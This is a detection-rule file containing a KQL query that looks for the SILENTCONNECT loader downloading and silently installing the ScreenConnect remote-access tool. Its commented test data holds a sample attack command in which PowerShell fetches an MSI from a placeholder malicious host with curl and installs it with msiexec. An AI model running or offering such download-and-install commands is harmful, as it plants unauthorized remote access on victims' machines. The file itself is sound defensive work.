# Name
SILENTCONNECT Loader and ScreenConnect Deployment

# Description
This detection suite identifies indicators of compromise (IOCs) and behaviors associated with SILENTCONNECT, a multi-stage loader designed to silently deploy the ConnectWise ScreenConnect Remote Monitoring and Management (RMM) tool. The threat actors utilize social engineering lures (VBScripts), PowerShell for in-memory execution, and PEB masquerading.

# References
- https://www.elastic.co/security-labs/silentconnect-delivers-screenconnect

# Author
- M4nbat

# Socials
- https://www.linkedin.com/in/grjk83/
- @knappresearchlb

# Threats
- SILENTCONNECT (Multi-stage Loader)
- ScreenConnect (Abused Legitimate RMM Tool)

# MITRE ATT&CK
- T1059.005: Command and Scripting Interpreter: Visual Basic
- T1059.001: Command and Scripting Interpreter: PowerShell
- T1562.001: Impair Defenses: Disable or Modify Tools
- T1219: Remote Access Software
- T1105: Ingress Tool Transfer

# Data Sources
- Microsoft Defender XDR / Microsoft Sentinel
   - DeviceProcessEvents

# Query
## Query 2 - SILENTCONNECT ScreenConnect Payload Download and Install
Detects the specific PowerShell command utilized by SILENTCONNECT to download the ScreenConnect MSI using curl.exe to the C:\Temp directory, followed by a silent installation using msiexec.exe.

```kql
// let DeviceProcessEvents = datatable(
//     Timestamp: datetime,
//     DeviceName: string,
//     ActionType: string,
//     FileName: string,
//     ProcessCommandLine: string,
//     AccountName: string,
//     InitiatingProcessFileName: string,
//     InitiatingProcessCommandLine: string
// )
// [
//     // Case 1: SILENTCONNECT payload download and install command
//     datetime(2026-03-27 11:00:00), "Workstation01", "ProcessCreated", "powershell.exe", "powershell.exe -c \"curl.exe 'https://malicious/e=Access&y=Guest' -o 'C:\\Temp\\ScreenConnect.ClientSetup.msi'; Start-Process msiexec.exe '/i C:\\Temp\\ScreenConnect.ClientSetup.msi'\"", "SYSTEM", "wscript.exe", "wscript.exe payload.vbs",
//     // Case 2: Normal msiexec usage (should not trigger)
//     datetime(2026-03-27 11:05:00), "Workstation02", "ProcessCreated", "msiexec.exe", "msiexec.exe /i C:\\Downloads\\legit.msi", "jdoe", "explorer.exe", "explorer.exe"
// ];
DeviceProcessEvents
| where Timestamp > ago(14d)
| where ActionType == "ProcessCreated"
| where FileName in~ ("powershell.exe", "pwsh.exe", "cmd.exe") or ProcessCommandLine has "powershell"
| where ProcessCommandLine has "C:\\Temp\\ScreenConnect.ClientSetup.msi"
    and ProcessCommandLine has "curl.exe"
    and ProcessCommandLine has "msiexec.exe"
| project Timestamp, DeviceName, AccountName, ActionType, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
```
